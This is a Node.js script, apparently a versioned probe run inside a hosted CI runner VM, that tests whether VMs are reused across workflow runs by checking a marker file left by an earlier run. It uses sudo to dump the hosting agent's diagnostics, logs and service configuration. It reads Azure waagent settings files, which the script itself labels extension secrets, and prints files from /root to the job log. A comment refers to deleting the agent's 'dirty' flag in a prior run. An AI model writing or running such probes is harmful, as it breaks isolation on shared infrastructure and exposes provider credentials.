const fs = require('fs');
const { execSync } = require('child_process');
const os = require('os');

// v32: VM reuse marker detection + diagnostics.json full dump + /opt/hca/ listing
// KEY: If /tmp/hca_vm_reuse_marker_v31 exists, v31 and v32 share the SAME VM (reuse confirmed!)

function run(cmd, timeoutMs) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: timeoutMs || 20000 }).trim(); }
  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 400).trim(); }
}

async function main() {
  console.log('=== V32: VM reuse marker detection ===');
  const hostname = os.hostname();
  const ts = Date.now();

  // === PART 1: Critical — check if v31 marker persists ===
  console.log('\n=== PART 1: VM reuse marker check ===');

  const v31Marker = '/tmp/hca_vm_reuse_marker_v31';
  const exists = fs.existsSync(v31Marker);
  console.log('[REUSE_TEST] v31 marker exists:', exists);

  if (exists) {
    const content = fs.readFileSync(v31Marker, 'utf8');
    console.log('[REUSE_TEST] *** VM REUSE CONFIRMED ***');
    console.log('[REUSE_TEST] v31 marker content:');
    console.log(content);
    console.log('[REUSE_TEST] Current hostname:', hostname);
    console.log('[REUSE_TEST] v31 timestamp (from marker):', content.match(/timestamp=(\d+)/)?.[1]);
    console.log('[REUSE_TEST] v32 timestamp:', ts);
    const elapsed = ts - parseInt(content.match(/timestamp=(\d+)/)?.[1] || '0');
    console.log('[REUSE_TEST] Time since v31:', Math.round(elapsed / 1000) + 's');
  } else {
    console.log('[REUSE_TEST] No v31 marker found — fresh VM (VMs are not reused across workflow runs)');
    console.log('[REUSE_TEST] Current hostname:', hostname);
  }

  // Check all markers in /tmp/
  const allMarkers = run('ls -la /tmp/hca_vm_reuse_marker_* 2>/dev/null || echo "no_markers"');
  console.log('[REUSE_TEST] All markers in /tmp/:', allMarkers);

  // === PART 2: Read diagnostics.json via sudo (full content) ===
  console.log('\n=== PART 2: /opt/hca/diagnostics.json via sudo ===');
  const diagStat = run('sudo stat /opt/hca/diagnostics.json 2>/dev/null || echo "not found"');
  console.log('[DIAG] stat:', diagStat);
  const diagContent = run('sudo cat /opt/hca/diagnostics.json 2>/dev/null || echo "not readable"');
  console.log('[DIAG] content:');
  console.log(diagContent);

  // === PART 3: Current /opt/hca/ state ===
  console.log('\n=== PART 3: Current /opt/hca/ state ===');
  console.log('[HCA_DIR]', run('ls -la /opt/hca/ 2>/dev/null'));
  console.log('[HCA_BINARY] MD5:', run('md5sum /opt/hca/hosted-compute-agent 2>/dev/null'));
  console.log('[HCA_DIRTY] environment.dirty exists:', fs.existsSync('/opt/hca/environment.dirty'));

  // === PART 4: HCA log — what does it say after dirty flag deletion? ===
  console.log('\n=== PART 4: HCA log content (post-dirty-flag-deletion in v31) ===');
  console.log('[HCA_LOG] Last 20 lines:');
  console.log(run('sudo tail -20 /opt/hca/logs/hosted-compute-agent.log 2>/dev/null'));

  // === PART 5: systemd service status for hosted-compute-agent ===
  console.log('\n=== PART 5: systemd hosted-compute-agent.service status ===');
  console.log('[SYSTEMD]', run('sudo systemctl status hosted-compute-agent.service 2>/dev/null | head -20'));
  console.log('[SYSTEMD] unit file:');
  console.log(run('sudo cat /etc/systemd/system/hosted-compute-agent.service 2>/dev/null || sudo systemctl cat hosted-compute-agent.service 2>/dev/null | head -40'));

  // === PART 6: Process list to see if provjobd is running ===
  console.log('\n=== PART 6: Process list ===');
  console.log('[PS]', run('ps aux --no-headers 2>/dev/null | grep -vE "^runner.*node|^runner.*bash|grep" | head -20'));

  // === PART 7: /var/lib/waagent/ for Azure extension secrets ===
  console.log('\n=== PART 7: Azure waagent secrets ===');
  const waagentList = run('sudo ls -la /var/lib/waagent/ 2>/dev/null');
  console.log('[WAAGENT]', waagentList);

  // Look for HandlerEnvironment.json or any .settings files
  const waagentSecrets = run('sudo find /var/lib/waagent -name "*.settings" -o -name "HandlerEnvironment.json" 2>/dev/null | head -5');
  if (waagentSecrets && !waagentSecrets.startsWith('ERR')) {
    for (const f of waagentSecrets.split('\n').filter(Boolean).slice(0, 3)) {
      console.log('[WAAGENT] File:', f);
      console.log('[WAAGENT] Content:', run('sudo cat ' + f + ' 2>/dev/null | head -20'));
    }
  }

  // === PART 8: /root/ contents ===
  console.log('\n=== PART 8: /root/ directory ===');
  const rootLs = run('sudo ls -la /root/ 2>/dev/null');
  console.log('[ROOT]', rootLs);
  const rootFiles = run('sudo find /root -maxdepth 3 -type f 2>/dev/null');
  if (rootFiles && !rootFiles.startsWith('ERR') && rootFiles.trim()) {
    for (const f of rootFiles.split('\n').filter(Boolean).slice(0, 5)) {
      console.log('[ROOT] File:', f);
      console.log('[ROOT] Content:', run('sudo cat ' + f + ' 2>/dev/null | head -10'));
    }
  }

  console.log('\n=== V32 Complete ===');
}

main().catch(e => console.log('Fatal:', e.message, e.stack));
